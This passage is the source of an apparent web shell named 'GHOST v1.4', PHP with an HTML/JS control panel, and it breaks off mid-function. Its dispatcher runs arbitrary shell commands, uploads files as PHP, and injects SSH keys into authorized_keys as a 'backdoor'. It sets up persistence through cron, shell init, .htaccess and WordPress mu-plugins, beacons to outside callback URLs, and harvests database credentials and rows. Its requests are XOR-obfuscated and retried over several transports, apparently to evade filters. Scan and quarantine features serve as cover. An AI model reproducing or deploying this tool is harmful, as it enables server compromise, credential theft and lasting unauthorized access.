    if (!ghost_csrf_ok()) ghost_json(['ok'=>false,'err'=>'csrf mismatch']);

    $act = $payload['act']; $P = $payload['params']; $caps = ghost_caps();

    switch ($act) {
        case 'ping': ghost_json(['ok'=>true, 'nonce'=>$GLOBALS['GHOST_NONCE'], 'field'=>$GLOBALS['GHOST_FIELD'], 'ver'=>$GLOBALS['GHOST_VER'], 'user'=>$caps['user'] ?? '?']);
        case 'caps': ghost_json(['ok'=>true, 'data'=>$caps, 'nonce'=>$GLOBALS['GHOST_NONCE']]);
        case 'scan_tree_page': ghost_json(['ok'=>true, 'data'=>ghost_scan_tree_page($GHOST_ROOT, (int)($P['page'] ?? 1), (int)($P['per_page'] ?? 60))]);
        case 'agent_loop': ghost_json(ghost_agent_loop($GHOST_ROOT, 5));
        case 'auto_pwn': ghost_json(ghost_auto_pwn($GHOST_ROOT, $caps));
        case 'read_file': $p = (string)($P['path'] ?? ''); if (!$p) ghost_json(['ok'=>false,'err'=>'no path']); ghost_json(ghost_read($p));
        case 'patch': ghost_json(ghost_patch((string)($P['patch_action'] ?? ''), (string)($P['target'] ?? ''), $P['extra'] ?? null));
        case 'exploit':
            $v = is_array($P['vuln'] ?? null) ? $P['vuln'] : json_decode((string)($P['vuln'] ?? '{}'), true);
            if (!$v) ghost_json(['ok'=>false,'err'=>'no vuln']); ghost_json(ghost_exploit_chain($v, $GHOST_ROOT));
        case 'ssh_audit': ghost_json(['ok'=>true,'data'=>ghost_ssh_audit()]);
        case 'vuln_audit': ghost_json(['ok'=>true,'data'=>ghost_vuln_audit($GHOST_ROOT)]);
        case 'db_scan': ghost_json(['ok'=>true,'data'=>ghost_db_configs($GHOST_ROOT)]);
        case 'db_harvest':
            $cfg = is_array($P['cfg'] ?? null) ? $P['cfg'] : json_decode((string)($P['cfg'] ?? '{}'), true);
            if (!$cfg) ghost_json(['ok'=>false,'err'=>'no cfg']); ghost_json(ghost_db_harvest($cfg));
        case 'persist': ghost_json(ghost_persist((string)($P['method'] ?? ''), (string)($P['url'] ?? ''), $caps));
        case 'beacon': ghost_json(ghost_beacon((string)($P['url'] ?? ''), (string)($P['data'] ?? 'ping')));
        case 'exec':
            $cmd = (string)($P['cmd'] ?? ''); if (!$cmd) ghost_json(['ok'=>false,'err'=>'no cmd']);
            ghost_json(ghost_exec($cmd, 30));
        case 'inject_ssh':
            $pub = trim((string)($P['pubkey'] ?? '')); if (!$pub) ghost_json(['ok'=>false,'err'=>'pubkey required']);
            if (preg_match('/[\r\n]/', $pub)) ghost_json(['ok'=>false,'err'=>'invalid key']);
            if (!preg_match('/^(ssh-(rsa|dss|ed25519)|ecdsa-sha2-|sk-)/', $pub)) ghost_json(['ok'=>false,'err'=>'invalid key type']);
            $home = @getenv('HOME') ?: ('/home/' . ($caps['user'] ?? 'root')); if (!@is_dir($home)) $home = '/root';
            $sd = $home . '/.ssh'; $ak = $sd . '/authorized_keys';
            if (!@is_dir($sd) && !@mkdir($sd, 0700, true)) ghost_json(['ok'=>false,'err'=>'mkdir .ssh failed']);
            $old = @file_get_contents($ak) ?: '';
            if (strpos($old, $pub) !== false) ghost_json(['ok'=>true,'msg'=>'key already present']);
            if ($old !== '' && substr($old,-1) !== "\n") $old .= "\n";
            if (@file_put_contents($ak, $old . $pub . "\n") === false) ghost_json(['ok'=>false,'err'=>'write authorized_keys failed']);
            @chmod($sd, 0700); @chmod($ak, 0600);
            ghost_json(['ok'=>true,'msg'=>'injected into ' . $ak]);
        case 'auto_heal':
            $vulns = ghost_vuln_audit($GHOST_ROOT); $patched = [];
            foreach ($vulns as $v) {
                if ($v['type'] === 'EXPOSED_FILE') { $p = ghost_patch('quarantine', $GHOST_ROOT . '/' . $v['file']); if ($p['ok']) $patched[] = $v['file']; }
                if ($v['type'] === 'WORLD_WRITABLE') { $p = ghost_patch('chmod', $GHOST_ROOT . '/' . $v['file'], '0644'); if ($p['ok']) $patched[] = $v['file'] . ' (chmod)'; }
                if ($v['type'] === 'UPLOADS_EXEC') { $p = ghost_patch('block_uploads', $GHOST_ROOT . '/wp-content/uploads'); if ($p['ok']) $patched[] = 'uploads/.htaccess'; }
            }
            ghost_json(['ok'=>true,'patched'=>$patched]);
        case 'content_scan':
            $kw = ['JUDOL'=>['slot','gacor','togel','toto','judi','maxwin','rtp','pragmatic','pgsoft','sabung ayam','bandar'],'PORNO'=>['bokep','porno','xxx','sex','kontol','memek','ngentot','colmek'],'SCAM'=>['phising','scam','penipuan','login palsu','transfer','rekening']];
            $out = []; $dl = ghost_deadline();
            try {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($GHOST_ROOT, FilesystemIterator::SKIP_DOTS));
                $n = 0;
                foreach ($it as $f) {
                    if (ghost_expired($dl) || $n++ > 800) break;
                    if (!$f->isFile() || $f->getSize() > 2*1024*1024) continue;
                    $ext = strtolower($f->getExtension());
                    if (!in_array($ext, ['php','html','htm','js','txt','json','sql','env','xml'])) continue;
                    $rd = ghost_read($f->getPathname()); if (!$rd['ok']) continue; $c = $rd['data'];
                    $title = '(no title)'; if (preg_match('/<title>(.*?)<\/title>/is', $c, $m)) $title = trim(html_entity_decode($m[1]));
                    $hits = []; foreach ($kw as $cat => $words) foreach ($words as $w) if (stripos($c, $w) !== false) { $hits[] = $cat; break; }
                    if (!empty($hits)) $out[] = ['path'=>$f->getPathname(),'title'=>$title,'hits'=>array_values(array_unique($hits)),'size'=>$f->getSize()];
                }
            } catch (Throwable $e) {}
            ghost_json(['ok'=>true,'data'=>$out]);
        case 'upload':
            if (empty($_FILES['file'])) ghost_json(['ok'=>false,'err'=>'no file']);
            $f = $_FILES['file']; $dest = (string)($P['dest'] ?? ($GHOST_ROOT . '/.ghost_upload_' . ghost_rand(4) . '.php'));
            if (move_uploaded_file($f['tmp_name'], $dest)) ghost_json(['ok'=>true,'msg'=>"uploaded to $dest"]);
            else { $d = ghost_read($f['tmp_name']); if ($d['ok']) ghost_json(ghost_write($dest, $d['data'])); else ghost_json(['ok'=>false,'err'=>'move_uploaded_file failed']); }
    }
    ghost_json(['ok'=>false,'err'=>'unknown act: ' . $act]);
}

if (isset($_GET['ping'])) {
    $caps = ghost_caps();
    ghost_json(['ok'=>true,'pong'=>time(),'ver'=>$GHOST_VER,'user'=>$caps['user'] ?? '?','nonce'=>$GHOST_NONCE,'field'=>$GHOST_FIELD]);
}

// ============================================================
// [14] UI RENDER
// ============================================================
$caps = ghost_probe();
header('Content-Type: text/html; charset=utf-8');
$csrf = ghost_h($GHOST_CSRF); $nonce = ghost_h($GHOST_NONCE); $field = ghost_h($GHOST_FIELD); $root_js = json_encode($GHOST_ROOT);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GHOST v1.4</title>
<style>
:root { --bg:#0b1220; --panel:#111c30; --border:#1e293b; --text:#cbd5e1; --accent:#38bdf8; --red:#ef4444; --green:#10b981; --yellow:#f59e0b; }
* { box-sizing:border-box; }
body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,monospace; background:var(--bg); color:var(--text); margin:0; font-size:13px; line-height:1.5; }
.container { max-width:1400px; margin:0 auto; padding:20px; }
header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); padding-bottom:10px; margin-bottom:20px; flex-wrap:wrap; gap:10px; }
h1 { margin:0; font-size:20px; color:var(--accent); letter-spacing:1px; }
.dim { color:#64748b; }
.tabs { display:flex; gap:10px; margin-bottom:20px; border-bottom:1px solid var(--border); flex-wrap:wrap; }
.tab { padding:10px 20px; cursor:pointer; border-bottom:2px solid transparent; color:#94a3b8; font-weight:bold; }
.tab.active { color:var(--accent); border-bottom-color:var(--accent); }
.tab-content { display:none; }
.tab-content.active { display:block; }
.card { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:15px; margin-bottom:20px; }
h2 { font-size:16px; color:var(--accent); margin-top:0; border-bottom:1px solid var(--border); padding-bottom:10px; }
table { width:100%; border-collapse:collapse; margin-bottom:10px; }
th,td { padding:8px 10px; border-bottom:1px solid var(--border); text-align:left; vertical-align:top; }
th { background:#1a2436; color:#94a3b8; font-weight:normal; }
.badge { padding:2px 6px; border-radius:4px; font-size:11px; font-weight:bold; display:inline-block; margin:2px; }
.b-red { background:#7f1d1d; color:#fca5a5; } .b-org { background:#78350f; color:#fcd34d; } .b-pur { background:#4c1d95; color:#c4b5fd; } .b-grn { background:#064e3b; color:#6ee7b7; }
.btn { background:var(--accent); color:var(--bg); border:none; padding:6px 12px; border-radius:4px; cursor:pointer; font-weight:bold; font-size:12px; }
.btn:hover { opacity:0.8; } .btn-red { background:var(--red); color:white; } .btn-sm { padding:4px 8px; font-size:11px; }
pre { background:#0a0f1a; padding:10px; border:1px solid var(--border); overflow-x:auto; white-space:pre-wrap; word-break:break-all; font-family:monospace; font-size:12px; color:#a5b4fc; }
.modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:1000; padding:20px; align-items:center; justify-content:center; }
.modal.show { display:flex; }
.modal-content { background:var(--panel); border:1px solid var(--accent); border-radius:8px; width:90%; max-width:1000px; max-height:90vh; overflow-y:auto; padding:20px; position:relative; }
.close { position:absolute; top:10px; right:15px; font-size:24px; cursor:pointer; color:var(--text); }
.close:hover { color:var(--red); }
input[type=text],input[type=password] { background:var(--bg); border:1px solid var(--border); color:var(--text); padding:8px; border-radius:4px; width:100%; margin-bottom:10px; }
.loader { display:inline-block; width:12px; height:12px; border:2px solid var(--border); border-top-color:var(--accent); border-radius:50%; animation:spin 1s linear infinite; margin-left:5px; }
@keyframes spin { to { transform:rotate(360deg); } }
.progress { background:var(--bg); border:1px solid var(--border); height:6px; border-radius:3px; overflow:hidden; margin-top:8px; }
.progress > div { background:var(--accent); height:100%; width:0%; transition:width 0.2s; }
#status-line { font-size:12px; }
</style>
</head>
<body>
<div class="container">
<header>
    <h1>GHOST v1.4</h1>
    <div class="dim" id="status-line">
        <?= ghost_h($caps['os_family']) ?> | PHP <?= ghost_h($caps['php_version']) ?> | <?= ghost_h($caps['user']) ?> (<?= (int)$caps['uid'] ?>) | <?= ghost_h($GHOST_ROOT) ?>
    </div>
</header>

<div class="tabs">
    <div class="tab active" onclick="switchTab(event,'scan')">Deep Scan</div>
    <div class="tab" onclick="switchTab(event,'content')">Content</div>
    <div class="tab" onclick="switchTab(event,'vuln')">Vulnerabilities</div>
    <div class="tab" onclick="switchTab(event,'ssh')">SSH Audit</div>
    <div class="tab" onclick="switchTab(event,'db')">Database</div>
    <div class="tab" onclick="switchTab(event,'action')">Exploit & Persist</div>
    <div class="tab" onclick="switchTab(event,'console')">Console</div>
</div>

<div id="tab-scan" class="tab-content active">
    <div class="card">
        <h2>Deep File Scan</h2>
        <p class="dim">Signature + entropy + deobfuscation. Streaming per chunk.</p>
        <button class="btn" onclick="runScan()" id="btnScan">Run Deep Scan</button>
        <span id="scanStatus" class="dim"></span>
        <div class="progress" id="scanProgress" style="display:none;"><div></div></div>
        <div id="scanResults" style="margin-top:15px;"></div>
    </div>
</div>

<div id="tab-content" class="tab-content">
    <div class="card">
        <h2>Illegal Content Inspector</h2>
        <button class="btn" onclick="runContentScan()" id="btnContent">Run Content Scan</button>
        <span id="contentStatus" class="dim"></span>
        <div id="contentResults" style="margin-top:15px;"></div>
    </div>
</div>

<div id="tab-vuln" class="tab-content">
    <div class="card">
        <h2>Vulnerability Audit</h2>
        <button class="btn" onclick="runVuln()" id="btnVuln">Run Audit</button>
        <button class="btn btn-red" onclick="autoHeal()" style="margin-left:10px;">Auto-Heal</button>
        <button class="btn" onclick="runAutoPwn()" style="margin-left:10px; background:#8b5cf6;">Auto-Pwn</button>
        <button class="btn" onclick="runAgent()" style="margin-left:10px; background:#10b981;">Run Agent Loop</button>
        <div id="pwnResult" style="margin-top:15px; font-family:monospace; color:var(--yellow);"></div>
        <span id="vulnStatus" class="dim"></span>
        <div id="vulnResults" style="margin-top:15px;"></div>
    </div>
</div>

<div id="tab-ssh" class="tab-content">
    <div class="card">
        <h2>SSH & Credential Audit</h2>
        <button class="btn" onclick="runSsh()" id="btnSsh">Run SSH Audit</button>
        <span id="sshStatus" class="dim"></span>
        <div id="sshResults" style="margin-top:15px;"></div>
    </div>
</div>

<div id="tab-db" class="tab-content">
    <div class="card">
        <h2>Database Harvest</h2>
        <button class="btn" onclick="runDb()" id="btnDb">Scan Configs</button>
        <span id="dbStatus" class="dim"></span>
        <div id="dbResults" style="margin-top:15px;"></div>
    </div>
</div>

<div id="tab-action" class="tab-content">
    <div class="card">
        <h2>Persistence</h2>
        <input type="text" id="persistUrl" placeholder="Callback URL">
        <div style="display:flex; gap:10px; flex-wrap:wrap;">
            <button class="btn btn-sm" onclick="runPersist('cron')">Cron</button>
            <button class="btn btn-sm" onclick="runPersist('bashrc')">Shell Init</button>
            <button class="btn btn-sm" onclick="runPersist('htaccess')">.htaccess / .user.ini</button>
            <button class="btn btn-sm" onclick="runPersist('wp_muplugin')">WP mu-plugin</button>
        </div>
        <div id="persistResults" style="margin-top:15px;"></div>
    </div>
    <div class="card">
        <h2>Callback Beacon</h2>
        <input type="text" id="beaconUrl" placeholder="Callback URL">
        <input type="text" id="beaconData" placeholder="Data (default: ping)">
        <button class="btn" onclick="runBeacon()">Send Beacon</button>
        <div id="beaconResults" style="margin-top:15px;"></div>
    </div>
    <div class="card">
        <h2>SSH Backdoor</h2>
        <input type="text" id="sshPubKey" placeholder="ssh-rsa AAAAB3Nza...">
        <button class="btn" onclick="injectSsh()">Inject SSH Key</button>
        <div id="sshResult" style="margin-top:10px;"></div>
    </div>
</div>

<div id="tab-console" class="tab-content">
    <div class="card">
        <h2>Execution Console</h2>
        <input type="text" id="consoleCmd" placeholder="Shell command…" onkeydown="if(event.key==='Enter') runCmd()">
        <button class="btn" onclick="runCmd()">Execute</button>
        <pre id="consoleOut" style="margin-top:15px; min-height:100px;"></pre>
    </div>
    <div class="card">
        <h2>File Upload</h2>
        <form id="uploadForm" onsubmit="uploadFile(event)">
            <input type="text" name="dest" id="uploadDest" placeholder="Destination path">
            <input type="file" name="file" style="margin-bottom:10px; color:var(--text);">
            <button type="submit" class="btn">Upload</button>
        </form>
        <div id="uploadResult" style="margin-top:10px;"></div>
    </div>
</div>
</div>

<div class="modal" id="modal">
    <div class="modal-content">
        <span class="close" onclick="document.getElementById('modal').classList.remove('show')">&times;</span>
        <h3 id="modalTitle" style="color:var(--accent); margin-top:0;"></h3>
        <pre id="modalBody"></pre>
    </div>
</div>

<script>
const CSRF   = '<?= $csrf ?>';
const NONCE  = '<?= $nonce ?>';
const FIELD  = '<?= $field ?>';
const ROOT   = <?= $root_js ?>;
const M_BEG  = 'GHOSTB64BEGIN';
const M_END  = 'GHOSTB64END';

/* ---------- crypto / envelope ---------- */
function utf8ToBytes(s){ return new TextEncoder().encode(s); }
function b64ToBytes(b64){ const bin = atob(b64); const arr = new Uint8Array(bin.length); for (let i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i); return arr; }
function bytesToB64(bytes){ let bin=''; for (let i=0;i<bytes.length;i++) bin += String.fromCharCode(bytes[i]); return btoa(bin); }
function xor(a,b){ const o = new Uint8Array(a.length); for (let i=0;i<a.length;i++) o[i] = a[i] ^ b[i % b.length]; return o; }
async function nonceKey(){ const k = await crypto.subtle.importKey('raw', utf8ToBytes(NONCE), {name:'HMAC', hash:'SHA-256'}, false, ['sign']); const sig = await crypto.subtle.sign('HMAC', k, utf8ToBytes('')); return new Uint8Array(sig); }

async function seal(payload){
    const key = await nonceKey();
    const inner = xor(utf8ToBytes(JSON.stringify(payload)), key);
    const outer = bytesToB64(inner);
    return bytesToB64(utf8ToBytes(outer));
}
/* ---------- response parser ---------- */
function gzB64ToJson(s){
    const bytes = b64ToBytes(s);
    if (bytes.length > 1 && bytes[0] === 0x1f && bytes[1] === 0x8b) {
        return new Response(new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'))).text();
    }
    return Promise.resolve(new TextDecoder().decode(bytes));
}
async function parseResp(text){
    const i = text.indexOf(M_BEG);
    const j = text.indexOf(M_END, i + 1);
    if (i < 0 || j < 0) {
        const preview = text.slice(0, 200).replace(/\s+/g, ' ');
        throw new Error('Server returned no envelope. Body preview: ' + preview);
    }
    const b64 = text.slice(i + M_BEG.length, j);
    try {
        const json = await gzB64ToJson(b64);
        return JSON.parse(json);
    } catch (e) {
        throw new Error('Envelope parse failed: ' + e.message);
    }
}

/* ---------- transport ---------- */
async function sendOnce(mode, act, params){
    const sealed = await seal({act, params});
    let url = window.location.pathname;
    let opts = { method:'POST', credentials:'same-origin', headers:{} };
    if (mode === 'form') {
        const body = new URLSearchParams();
        body.append(FIELD, sealed); body.append('_n', NONCE); body.append('csrf', CSRF);
        opts.body = body.toString();
        opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    } else if (mode === 'form-diag') {
        const body = new URLSearchParams();
        body.append('_blob', sealed); body.append('_n', NONCE); body.append('csrf', CSRF);
        opts.body = body.toString();
        opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    } else if (mode === 'multipart') {
        const fd = new FormData();
        fd.append(FIELD, sealed); fd.append('_n', NONCE); fd.append('csrf', CSRF);
        opts.body = fd;
    } else if (mode === 'text') {
        const body = FIELD + '=' + encodeURIComponent(sealed) + '&_n=' + encodeURIComponent(NONCE) + '&csrf=' + encodeURIComponent(CSRF);
        opts.body = body;
        opts.headers['Content-Type'] = 'text/plain';
    } else if (mode === 'binary') {
        const body = FIELD + '=' + encodeURIComponent(sealed) + '&_n=' + encodeURIComponent(NONCE) + '&csrf=' + encodeURIComponent(CSRF);
        opts.body = body;
        opts.headers['Content-Type'] = 'application/octet-stream';
    } else if (mode === 'get') {
        const qs = FIELD + '=' + encodeURIComponent(sealed) + '&_n=' + encodeURIComponent(NONCE) + '&csrf=' + encodeURIComponent(CSRF);
        url = url + '?' + qs;
        opts = { method:'GET', credentials:'same-origin' };
    }
    const r = await fetch(url, opts);
    const txt = await r.text();
    return { status: r.status, text: txt };
}

async function api(act, params){
    const modes = ['form', 'form-diag', 'multipart', 'text', 'binary', 'get'];
    let lastErr = null;
    for (const m of modes) {
        try {
            const r = await sendOnce(m, act, params || {});
            if (r.status >= 400) { lastErr = new Error('HTTP ' + r.status + ' via ' + m + ' — ' + r.text.slice(0,120)); continue; }
            const json = await parseResp(r.text);
            return json;
        } catch (e) {
            lastErr = e;
        }
    }
    throw lastErr || new Error('all transports failed');
}

/* ---------- UI helpers ---------- */
function switchTab(ev, name){
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    if (ev && ev.target) ev.target.classList.add('active');
    const el = document.getElementById('tab-' + name); if (el) el.classList.add('active');
}
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function openModal(t, b){ document.getElementById('modalTitle').innerText = t; document.getElementById('modalBody').innerText = b; document.getElementById('modal').classList.add('show'); }

/* ---------- scan ---------- */
async function runScan(){
    const btn = document.getElementById('btnScan');
    const status = document.getElementById('scanStatus');
    const res = document.getElementById('scanResults');
    const prog = document.getElementById('scanProgress');
    const bar = prog.firstElementChild;
    btn.disabled = true; prog.style.display = 'block'; bar.style.width = '0%'; res.innerHTML = '';
    status.innerHTML = '<span class="loader"></span> scanning…';
    let page = 1, all = [], total = 0, perPage = 60;
    try {
        while (true) {
            const d = await api('scan_tree_page', { page, per_page: perPage });
            if (!d.ok) { status.innerText = 'Error: ' + (d.err || 'unknown'); break; }
            const data = d.data;
            total = data.total_candidates || 0;
            all = all.concat(data.items || []);
            const pct = total > 0 ? Math.min(100, Math.round((data.scanned / total) * 100)) : 100;
            bar.style.width = pct + '%';
            status.innerHTML = `<span class="loader"></span> ${data.scanned}/${total} — ${all.length} suspicious`;
            if (data.done) break;
            page = data.page + 1;
            if (page > 200) break;
        }
    } catch (e) {
        if (perPage > 20) {
            perPage = 20;
            status.innerHTML = '<span class="loader"></span> retry with smaller chunks…';
            try {
                while (true) {
                    const d = await api('scan_tree_page', { page, per_page: perPage });
                    if (!d.ok) break;
                    total = d.data.total_candidates || 0;
                    all = all.concat(d.data.items || []);
                    if (d.data.done) break;
                    page = d.data.page + 1;
                    if (page > 500) break;
                }
            } catch (e2) { status.innerText = 'Error: ' + e2.message; btn.disabled = false; return; }
        } else { status.innerText = 'Error: ' + e.message; btn.disabled = false; return; }
    }
    btn.disabled = false; prog.style.display = 'none';
    status.innerText = `Done. ${all.length} suspicious of ${total}.`;
    if (!all.length) return;
    all.sort((a,b) => b.score - a.score);
    let html = '<table><tr><th>Verdict</th><th>Path</th><th>Hits</th><th>Actions</th></tr>';
    all.forEach(f => {
        const cls = f.verdict === 'CRITICAL' ? 'b-red' : (f.verdict === 'HIGH' ? 'b-org' : 'b-pur');
        const hits = f.hits.map(h => `<span class="badge b-org">${esc(h)}</span>`).join('');
        const rel = f.path.startsWith(ROOT) ? f.path.slice(ROOT.length) : f.path;
        html += `<tr><td><span class="badge ${cls}">${f.verdict}</span></td><td style="font-family:monospace;">${esc(rel)}<br><small class="dim">${esc(f.reason||'')}</small></td><td>${hits}</td>
            <td><button class="btn btn-sm" onclick="viewFile('${esc(f.path)}')">View</button>
                <button class="btn btn-sm btn-red" onclick="quarantine('${esc(f.path)}')">Quarantine</button>
                <button class="btn btn-sm btn-red" onclick="deleteFile('${esc(f.path)}')">Delete</button></td></tr>`;
    });
    res.innerHTML = html + '</table>';
}

/* ---------- audit ---------- */
async function runVuln(){
    const btn = document.getElementById('btnVuln'), status = document.getElementById('vulnStatus'), res = document.getElementById('vulnResults');
    btn.disabled = true; status.innerHTML = '<span class="loader"></span> auditing…'; res.innerHTML = '';
    try {
        const d = await api('vuln_audit');
        btn.disabled = false;
        if (!d.ok) { status.innerText = 'Error'; return; }
        status.innerText = `${d.data.length} issues.`;
        if (!d.data.length) return;
        let html = '<table><tr><th>Severity</th><th>Type</th><th>Detail</th><th>Actions</th></tr>';
        d.data.forEach(v => {
            const cls = v.severity === 'CRITICAL' ? 'b-red' : (v.severity === 'HIGH' ? 'b-org' : 'b-pur');
            const payload = JSON.stringify(v).replace(/'/g, "&#39;");
            html += `<tr><td><span class="badge ${cls}">${v.severity}</span></td><td><span class="badge b-grn">${esc(v.type)}</span></td><td>${esc(v.detail)}</td><td><button class="btn btn-sm" onclick='exploitVuln(${payload})'>Exploit</button></td></tr>`;
        });
        res.innerHTML = html + '</table>';
    } catch (e) { btn.disabled = false; status.innerText = 'Error: ' + e.message; }
}

async function runSsh(){
    const btn = document.getElementById('btnSsh'), status = document.getElementById('sshStatus'), res = document.getElementById('sshResults');
    btn.disabled = true; status.innerHTML = '<span class="loader"></span> ssh audit…'; res.innerHTML = '';
    try {
        const d = await api('ssh_audit'); btn.disabled = false; if (!d.ok) return;
        let html = '';
        const sections = {authorized_keys:'Authorized Keys',private_keys:'Private Keys',known_hosts:'Known Hosts',sshd_config:'SSHD Config',agent_sockets:'Agent Sockets'};
        for (const [k, title] of Object.entries(sections)) {
            const items = d.data[k] || [];
            html += `<h3>${title} (${items.length})</h3>`;
            if (!items.length) { html += '<p class="dim">None.</p>'; continue; }
            html += '<table><tr><th>Detail</th><th>Actions</th></tr>';
            items.forEach(it => {
                let detail = esc(it.file || it.hosts || it.type || JSON.stringify(it)); let actions = '';
                if (k === 'authorized_keys') { actions = `<button class="btn btn-sm btn-red" onclick="revokeSsh('${esc(it.file)}','${esc(it.line)}')">Revoke</button>`; detail = `${esc(it.file)} : ${esc(it.type)} ${esc(it.comment)}`; }
                else if (k === 'private_keys') { detail = `${esc(it.file)} [${it.type}] ${it.encrypted ? 'ENCRYPTED' : 'PLAINTEXT'}`; actions = `<button class="btn btn-sm" onclick="viewFile('${esc(it.file)}')">Read</button>`; }
                else if (k === 'sshd_config' || k === 'known_hosts') { actions = `<button class="btn btn-sm" onclick="viewFile('${esc(it.file)}')">View</button>`; }
                html += `<tr><td style="font-family:monospace;">${detail}</td><td>${actions}</td></tr>`;
            });
            html += '</table>';
        }
        res.innerHTML = html;
    } catch (e) { btn.disabled = false; status.innerText = 'Error: ' + e.message; }
}

async function runDb(){
    const btn = document.getElementById('btnDb'), status = document.getElementById('dbStatus'), res = document.getElementById('dbResults');
    btn.disabled = true; status.innerHTML = '<span class="loader"></span> scanning configs…'; res.innerHTML = '';
    try {
        const d = await api('db_scan'); btn.disabled = false; if (!d.ok) { status.innerText = 'Error'; return; }
        status.innerText = `${d.data.length} configs.`;
        if (!d.data.length) return;
        let html = '<table><tr><th>App</th><th>File</th><th>Host</th><th>User</th><th>Pass</th><th>DB</th><th>Actions</th></tr>';
        d.data.forEach(c => {
            const rel = c.file.startsWith(ROOT) ? c.file.slice(ROOT.length) : c.file;
            const payload = JSON.stringify(c).replace(/'/g, "&#39;");
            html += `<tr><td><span class="badge b-pur">${esc(c.app)}</span></td><td style="font-family:monospace;">${esc(rel)}</td><td>${esc(c.host||'')}</td><td>${esc(c.user||'')}</td><td style="color:var(--red); font-family:monospace;">${esc(c.pass||'')}</td><td>${esc(c.db||'')}</td><td><button class="btn btn-sm" onclick='harvestDb(${payload})'>Harvest</button></td></tr>`;
        });
        res.innerHTML = html + '</table>';
    } catch (e) { btn.disabled = false; status.innerText = 'Error: ' + e.message; }
}

async function harvestDb(cfg){
    openModal('Database Harvest', 'Connecting...');
    try {
        const d = await api('db_harvest', { cfg });
        if (!d.ok) { openModal('Error', d.err); return; }
        let out = `Connected via ${d.via} as ${d.user}\n\nDATABASES:\n${d.databases.join('\n')}\n\n`;
        if (d.tables && d.tables.length) out += `TABLES in ${cfg.db}:\n${d.tables.join('\n')}\n\n`;
        if (d.tables_data) for (const [t,r] of Object.entries(d.tables_data)) { out += `\n[${t}] (${r.length} rows)\n`; r.forEach(x => out += JSON.stringify(x) + '\n'); }
        openModal('Database Harvest', out);
    } catch (e) { openModal('Error', e.message); }
}

async function exploitVuln(v){
    openModal('Exploit', 'Running...');
    try {
        const d = await api('exploit', { vuln: v });
        let out = `Status: ${d.ok?'SUCCESS':'FAILED'}\n\nSteps:\n${(d.steps||[]).join('\n')}\n\nResult:\n${d.result||'none'}`;
        document.getElementById('modalTitle').innerText = 'Exploit Result';
        let html = `<pre>${esc(out)}</pre>`;
        if (v.type === 'SYMLINK' && d.link_path) html += `<div style="margin-top:15px; border-top:1px solid #334155; padding-top:15px;"><button class="btn btn-red" onclick="removeSymlink('${esc(d.link_path)}')">Hapus Symlink</button></div>`;
        document.getElementById('modalBody').innerHTML = html;
    } catch (e) { openModal('Error', e.message); }
}
async function removeSymlink(p){
    if (!confirm('Hapus symlink ' + p + '?')) return;
    try {
        const d = await api('patch', { patch_action:'delete', target: ROOT + p });
        alert(d.ok ? 'deleted' : 'fail: ' + d.msg);
        if (d.ok) { document.getElementById('modal').classList.remove('show'); runVuln(); }
    } catch (e) { alert(e.message); }
}

async function runPersist(method){
    const url = document.getElementById('persistUrl').value;
    const res = document.getElementById('persistResults'); res.innerText = 'installing…';
    try { const d = await api('persist', { method, url }); res.innerHTML = `<span class="badge ${d.ok?'b-grn':'b-red'}">${d.ok?'OK':'FAIL'}</span> ${esc(d.msg)}`; }
    catch (e) { res.innerText = 'Error: ' + e.message; }
}
async function runBeacon(){
    const url = document.getElementById('beaconUrl').value;
    const data = document.getElementById('beaconData').value;
    const res = document.getElementById('beaconResults'); if (!url) { res.innerText = 'URL required'; return; }
    res.innerText = 'sending…';
    try { const d = await api('beacon', { url, data }); res.innerHTML = `<span class="badge ${d.ok?'b-grn':'b-red'}">${d.ok?'SENT':'FAIL'}</span> via ${d.via}`; }
    catch (e) { res.innerText = 'Error: ' + e.message; }
}
async function runCmd(){
    const cmd = document.getElementById('consoleCmd').value;
    const out = document.getElementById('consoleOut'); if (!cmd) return;
    out.innerText = '$ ' + cmd + '\n\nRunning...';
    try { const d = await api('exec', { cmd }); out.innerText = '$ ' + cmd + '\n\n' + (d.out || d.err || '(no output)'); }
    catch (e) { out.innerText = '$ ' + cmd + '\n\nError: ' + e.message; }
}
async function viewFile(p){
    openModal(p, 'loading…');
    try { const d = await api('read_file', { path: p }); openModal(p, d.ok ? d.data : 'Error: ' + d.err); }
    catch (e) { openModal(p, 'Error: ' + e.message); }
}
async function quarantine(p){
    if (!confirm('Quarantine ' + p + '?')) return;
    try { const d = await api('patch', { patch_action:'quarantine', target: p }); alert(d.ok ? d.msg : 'fail: ' + d.msg); if (d.ok) runScan(); }
    catch (e) { alert(e.message); }
}
async function deleteFile(p){
    if (!confirm('HAPUS PERMANEN: ' + p + '?')) return;
    try { const d = await api('patch', { patch_action:'delete', target: p }); alert(d.ok ? d.msg : 'fail: ' + d.msg); if (d.ok) runScan(); }
    catch (e) { alert(e.message); }
}
async function revokeSsh(file, line){
    if (!confirm('Revoke this key?')) return;
    try { const d = await api('patch', { patch_action:'revoke_ssh', target: file, extra: line }); alert(d.ok ? d.msg : 'fail: ' + d.msg); if (d.ok) runSsh(); }
    catch (e) { alert(e.message); }
}
async function autoHeal(){
    if (!confirm('Quarantine exposed files and fix perms?')) return;
    const res = document.getElementById('vulnResults'); res.innerText = 'healing…';
    try {
        const d = await api('auto_heal');
        if (d.patched && d.patched.length) { res.innerHTML = '<div class="badge b-grn">Healed</div><br>' + d.patched.map(esc).join('<br>'); runVuln(); }
        else res.innerHTML = '<div class="badge b-red">nothing healed</div>';
    } catch (e) { res.innerText = 'Error: ' + e.message; }
}
async function runContentScan(){
    const btn = document.getElementById('btnContent'), status = document.getElementById('contentStatus'), res = document.getElementById('contentResults');
